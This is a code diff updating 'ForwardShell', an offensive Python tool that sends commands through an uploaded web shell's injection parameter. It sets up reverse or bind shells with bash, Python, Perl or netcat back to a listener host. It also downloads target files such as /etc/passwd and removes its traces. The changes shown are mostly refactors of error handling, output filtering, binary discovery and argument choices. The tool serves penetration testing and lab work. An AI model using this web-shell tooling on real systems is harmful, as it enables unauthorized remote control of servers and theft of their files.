@@ -46,9 +46,9 @@ class WebShell(object):
         self.revshell = options.revshell.lower()
         self.bindshell = options.bindshell.lower()
         self.working_path = options.path
+        self.verbose = options.verbose
         self.display_prefix = options.prefix
         self.display_suffix = options.suffix
-        self.verbose = options.verbose
         
         # Set up proxy
         self.proxies = {}
@@ -99,9 +99,6 @@ class WebShell(object):
             self.RunRawCmd(ClearOutput)
         else:
             print(f"[ERROR] Cannot connect to {self.url}")
-            if self.verbose:
-                print(f"[VERBOSE] Server response was {CheckConnction}")
-                print(f"[VERBOSE] Maybe you have to adjust the values for -prefix and -suffix")
             exit()
 
         # Set up read thread
@@ -116,6 +113,7 @@ class WebShell(object):
 #                                                                                    #
 # Functions are:                                                                     # 
 # Help                  Show Program Help                                            #
+# Error                 Show Error Message with Some Help                            #
 #                                                                                    #
 ######################################################################################
 
@@ -134,6 +132,7 @@ class WebShell(object):
             f'  ?download {{filename}}    Download a file from the target to your local working directory\n'
             f'  ?exit                   Stops the Shell, kills processes, removes files on the target system and exits the program\n'
             f'  ?exit -force            Stops the Shell, kill all processes and files from all possible running or stuck Shells\n')
+
         elif module == 'Set':
             print(
             f'[?] {__progname__} - ReverseShell Parameter:\n'
@@ -177,6 +176,16 @@ class WebShell(object):
             f'> ?download /etc/passwd\n')
         else:
             pass
+
+    def Error(self, raw_result, filtered_result):
+        if self.verbose:
+            print(f"[VERBOSE] Original server response was \'{raw_result}\'")
+            print(f"[VERBOSE] Server response after display filter is \'{filtered_result}\'")
+            print(f"[VERBOSE] Likely that you have to adjust the values for -prefix and -suffix or your request URL with parameter is wrong")
+        print(f"[ERROR] Cannot establish a shell with URL {self.url}?{self.parameter}={{CommandInjection}}")
+        print(f"[ERROR] Please use the program switch -verbose to get more details of the connection issue or -h to get more help")
+        exit()
+
 
 ######################################################################################
 #                                                                                    #
@@ -536,17 +545,34 @@ class WebShell(object):
     # Use this to adjust the results if needed
     def DisplayResp(self, raw_input):
 
-            if self.display_prefix and self.display_suffix:
+        display_result = raw_input.strip('\n')
 
-                # use the user provided prefix and suffix to build a RegEx
+        if options.prefix or options.suffix:
+            # use the user provided prefix and suffix to build a RegEx
+            if self.display_prefix and self.display_suffix:
                 pattern = f'{self.display_prefix}(.*){self.display_suffix}'
-                result = re.search(pattern, raw_input, re.DOTALL)
-                return result.group(1).strip('\n')
-            else:
-                return raw_input.strip('\n')
+
+            # use the user provided prefix to build a RegEx
+            elif self.display_prefix:
+                pattern = f'{self.display_prefix}(.*)'
+
+            # use the user provided suffix to build a RegEx
+            elif self.display_suffix:
+                pattern = f'(.*){self.display_suffix}'
+            
+            result = re.search(pattern, raw_input, re.DOTALL)
+
+            try:
+                display_result = result.group(1).strip('\n')
+            except:
+                pass
+
+        return display_result
 
     # Helper Module to get the file system path of a programm
     def GetBinPath(self, file):
+        first_run = True
+        binary_found = False
 
         try:
             # check if which found already and use it to search for binaries
@@ -564,12 +590,17 @@ class WebShell(object):
                 filename = f'ls {path}/{file}'
                 raw_result = self.RunRawCmd(filename)
                 result = self.DisplayResp(raw_result)
-                if result:
+                if result == f'{path}/{file}':
                     if self.verbose: print(f"[VERBOSE] Found binary path {result}")
+                    binary_found = True
                     return result
-                    break
                 else:
+                    if self.verbose: print(f'[VERBOSE] Binary {file} not found in {path}')
                     pass
+            # If not even the binary bash has been found, the program has to be stopped
+            if binary_found == False:
+                if file == 'bash':
+                    self.Error(raw_result, result)
 
     # Get path of needed binaries on target
     def GetProg(self):
@@ -595,8 +626,9 @@ class WebShell(object):
                 elif binary == "rm": self.RM = result
                 elif binary == "sh": self.SH = result
                 elif binary == "tail": self.TAIL = result
-                else: print(f"[ERROR] No path for needed binary {binary} found")
-            else: print(f"[ERROR] No path for needed binary {binary} found")
+            else:
+                if self.verbose: print(f"[VERBOSE] No path to binary {binary} found")
+                pass
 
         binaries_python = ["python", "python3", "python2"]
         for version in binaries_python:
@@ -604,6 +636,9 @@ class WebShell(object):
             if result:
                 self.PYTHON = result
                 break
+            else:
+                if self.verbose: print(f"[VERBOSE] No path to binary {version} found")
+                pass
 
         binaries_netcat = ["ncat", "netcat", "nc"]
         for version in binaries_netcat:
@@ -611,6 +646,9 @@ class WebShell(object):
             if result:
                 self.NETCAT = result
                 break
+            else: 
+                if self.verbose: print(f"[VERBOSE] No path to binary {version} found")
+                pass
         
     # Helper module to split var in chunks
     def split_chunks(self, seq, n=8000):
@@ -627,7 +665,7 @@ class WebShell(object):
 # Process command-line arguments.
 if __name__ == '__main__':
     __progname__ = 'ForwardShell'
-    __version__ = '0.2.2'
+    __version__ = '0.2.3'
 
     parser = argparse.ArgumentParser(
         add_help = True,
@@ -636,19 +674,19 @@ if __name__ == '__main__':
         epilog = 'HAVE FUN AND DON\'T BE EVIL!')
 
     parser.add_argument('-u', action='store', metavar='', help='http[s]://[fqdn,IP]/directory/upload/shell.[php,jsp]')
-    parser.add_argument('-m', action='store', metavar='', default = 'POST', help='HTTP method to use for requests [GET, POST; default=POST]')
+    parser.add_argument('-m', action='store', metavar='', choices=['post', 'get'], default = 'POST', help='HTTP method to use for requests [GET, POST; default=POST]')
     parser.add_argument('-p', action='store', metavar='', default = 'cmd', help='The parameter of the uploaded webshell which executes the command [default=cmd]')
     parser.add_argument('-P', action='store', metavar='', default = '', help='Proxy to use for requests [http(s)://host:port]')
 
     group = parser.add_argument_group('you can use even more Bind- and ReverseShell arguments')
     group.add_argument('-lhost', action='store', metavar='', default = '127.0.0.1', help='Your local listening IP address if you use the ReverseShell option')
     group.add_argument('-lport', action='store', metavar='', default = '9001', help='Your local listening TCP port if you use the Bind- or ReverseShell option')
-    group.add_argument('-revshell', action='store', metavar='', default = 'Bash', help='Kind of ReverseShell [Bash, Python, Perl; default=Bash]')
-    group.add_argument('-bindshell', action='store', metavar='', default = 'Python', help='Kind of BindShell [Python, Netcat, Perl; default=Python]')
-    group.add_argument('-speed', action='store', metavar='', default = 'fast', help='Network speed to the target [Insane, Fast, Medium, Slow; default=Fast]')
+    group.add_argument('-revshell', action='store', metavar='', choices=['bash', 'python', 'perl'], default = 'Bash', help='Kind of ReverseShell [Bash, Python, Perl; default=Bash]')
+    group.add_argument('-bindshell', action='store', metavar='', choices=['python', 'netcat', 'perl'], default = 'Python', help='Kind of BindShell [Python, Netcat, Perl; default=Python]')
+    group.add_argument('-speed', action='store', metavar='', choices=['insane', 'fast', 'medium', 'slow'], default = 'fast', help='Network speed to the target [Insane, Fast, Medium, Slow; default=Fast]')
     group.add_argument('-path', action='store', metavar='', default = '/dev/shm', help='Default {__progname__} working path; Change it to /tmp if /dev/shm is not available')
-    group.add_argument('-prefix', action='store', metavar='', default = False, help='If the WebShell responses with more then the expected output use -prefix to define the unneeded pattern in front the output')
-    group.add_argument('-suffix', action='store', metavar='', default = False, help='If the WebShell responses with more then the expected output use -suffix to define the unneeded pattern after the output')
+    group.add_argument('-prefix', action='store', metavar='', default = '', help='If the WebShell responses with more then the expected output use -prefix to define the unneeded pattern in front the output')
+    group.add_argument('-suffix', action='store', metavar='', default = '', help='If the WebShell responses with more then the expected output use -suffix to define the unneeded pattern after the output')
     group.add_argument('-verbose', action='store_true', default = False, help='Use it to set verbose output')
     options = parser.parse_args()
 
